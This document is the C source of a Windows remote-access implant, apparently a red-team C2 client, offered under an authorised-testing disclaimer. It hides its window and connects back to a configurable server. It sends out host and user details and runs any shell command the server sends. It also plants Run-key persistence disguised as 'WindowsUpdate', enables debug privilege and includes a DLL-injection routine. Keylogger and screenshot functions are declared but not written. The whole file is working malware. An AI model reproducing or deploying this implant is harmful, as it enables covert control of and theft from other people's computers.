/*
 * Moonlight C2 Framework - Client Implant
 * Target: Windows XP/2000/95/Server 2003/2008
 * Purpose: Penetration Testing and Red Team Operations
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define BUFFER_SIZE 8192
#define HEARTBEAT_INTERVAL 30
#define RECONNECT_INTERVAL 10

// Configuration
char g_ServerIP[64] = "127.0.0.1";
int g_ServerPort = 4444;
BOOL g_Running = TRUE;
SOCKET g_Socket = INVALID_SOCKET;

// Function prototypes
void GetSysInfo(char* buffer, size_t size);
void ExecuteCommand(const char* command, char* output, size_t output_size);
void SendData(const char* data);
BOOL ConnectToServer();
void MainLoop();
void InstallPersistence();
void ElevatePrivileges();
BOOL InjectDLL(DWORD pid, const char* dll_path);
void KeyloggerThread();
void ScreenshotCapture(const char* filename);

void GetSysInfo(char* buffer, size_t size) {
    char hostname[256] = {0};
    char username[256] = {0};
    char osversion[256] = {0};
    DWORD username_size = sizeof(username);
    DWORD hostname_size = sizeof(hostname);
    
    GetComputerNameA(hostname, &hostname_size);
    GetUserNameA(username, &username_size);
    
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    
    if (GetVersionExA(&osvi)) {
        snprintf(osversion, sizeof(osversion), "Windows %d.%d Build %d",
                 osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    } else {
        strcpy(osversion, "Unknown");
    }
    
    snprintf(buffer, size, "SYSINFO:%s|%s|%s|%d\n",
             hostname, username, osversion, GetCurrentProcessId());
}

void ExecuteCommand(const char* command, char* output, size_t output_size) {
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        snprintf(output, output_size, "[!] CreatePipe failed: %d\n", GetLastError());
        return;
    }
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;
    
    char cmdline[1024];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", command);
    
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        snprintf(output, output_size, "[!] CreateProcess failed: %d\n", GetLastError());
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }
    
    CloseHandle(hWritePipe);
    
    DWORD bytesRead;
    char buffer[4096];
    DWORD totalBytes = 0;
    
    output[0] = '\0';
    
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        if (totalBytes + bytesRead < output_size - 1) {
            strcat(output, buffer);
            totalBytes += bytesRead;
        }
    }
    
    WaitForSingleObject(pi.hProcess, 5000);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);
}

void SendData(const char* data) {
    if (g_Socket != INVALID_SOCKET) {
        send(g_Socket, data, strlen(data), 0);
    }
}

BOOL ConnectToServer() {
    WSADATA wsa;
    struct sockaddr_in server;
    
    if (g_Socket != INVALID_SOCKET) {
        closesocket(g_Socket);
        g_Socket = INVALID_SOCKET;
    }
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return FALSE;
    }
    
    g_Socket = socket(AF_INET, SOCK_STREAM, 0);
    if (g_Socket == INVALID_SOCKET) {
        return FALSE;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(g_ServerPort);
    server.sin_addr.s_addr = inet_addr(g_ServerIP);
    
    if (connect(g_Socket, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(g_Socket);
        g_Socket = INVALID_SOCKET;
        return FALSE;
    }
    
    return TRUE;
}

void InstallPersistence() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    HKEY hKey;
    const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

void ElevatePrivileges() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
        CloseHandle(hToken);
    }
}

BOOL InjectDLL(DWORD pid, const char* dll_path) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return FALSE;
    }
    
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1, 
                                       MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteBuf) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dll_path, 
                      strlen(dll_path) + 1, NULL);
    
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                       pRemoteBuf, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return hThread != NULL;
}

void MainLoop() {
    char buffer[BUFFER_SIZE];
    char sysinfo[512];
    time_t lastHeartbeat = 0;
    
    while (g_Running) {
        if (g_Socket == INVALID_SOCKET) {
            Sleep(RECONNECT_INTERVAL * 1000);
            if (ConnectToServer()) {
                GetSysInfo(sysinfo, sizeof(sysinfo));
                SendData(sysinfo);
            }
            continue;
        }
        
        // Send heartbeat
        time_t currentTime = time(NULL);
        if (currentTime - lastHeartbeat >= HEARTBEAT_INTERVAL) {
            SendData("HEARTBEAT\n");
            lastHeartbeat = currentTime;
        }
        
        // Check for commands
        fd_set readfds;
        struct timeval timeout;
        FD_ZERO(&readfds);
        FD_SET(g_Socket, &readfds);
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int activity = select(0, &readfds, NULL, NULL, &timeout);
        
        if (activity > 0 && FD_ISSET(g_Socket, &readfds)) {
            memset(buffer, 0, BUFFER_SIZE);
            int bytesReceived = recv(g_Socket, buffer, BUFFER_SIZE - 1, 0);
            
            if (bytesReceived <= 0) {
                closesocket(g_Socket);
                g_Socket = INVALID_SOCKET;
                continue;
            }
            
            buffer[bytesReceived] = '\0';
            
            // Process command
            if (strncmp(buffer, "CMD:", 4) == 0) {
                char output[BUFFER_SIZE];
                ExecuteCommand(buffer + 4, output, sizeof(output));
                SendData(output);
            }
            else if (strncmp(buffer, "SYSINFO", 7) == 0) {
                GetSysInfo(sysinfo, sizeof(sysinfo));
                SendData(sysinfo);
            }
            else if (strncmp(buffer, "PERSIST", 7) == 0) {
                InstallPersistence();
                SendData("Persistence installed\n");
            }
            else if (strncmp(buffer, "ELEVATE", 7) == 0) {
                ElevatePrivileges();
                SendData("Privilege elevation attempted\n");
            }
            else if (strncmp(buffer, "EXIT", 4) == 0) {
                g_Running = FALSE;
            }
        }
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
    }
    
    // Parse command line arguments
    if (lpCmdLine && strlen(lpCmdLine) > 0) {
        char* portStr = strchr(lpCmdLine, ':');
        if (portStr) {
            *portStr = '\0';
            portStr++;
            g_ServerPort = atoi(portStr);
            strncpy(g_ServerIP, lpCmdLine, sizeof(g_ServerIP) - 1);
        } else {
            strncpy(g_ServerIP, lpCmdLine, sizeof(g_ServerIP) - 1);
        }
    }
    
    MainLoop();
    
    if (g_Socket != INVALID_SOCKET) {
        closesocket(g_Socket);
    }
    WSACleanup();
    
    return 0;
}

#ifdef _CONSOLE
int main(int argc, char* argv[]) {
    if (argc > 1) {
        strncpy(g_ServerIP, argv[1], sizeof(g_ServerIP) - 1);
    }
    if (argc > 2) {
        g_ServerPort = atoi(argv[2]);
    }
    
    MainLoop();
    
    if (g_Socket != INVALID_SOCKET) {
        closesocket(g_Socket);
    }
    WSACleanup();
    
    return 0;
}
#endif
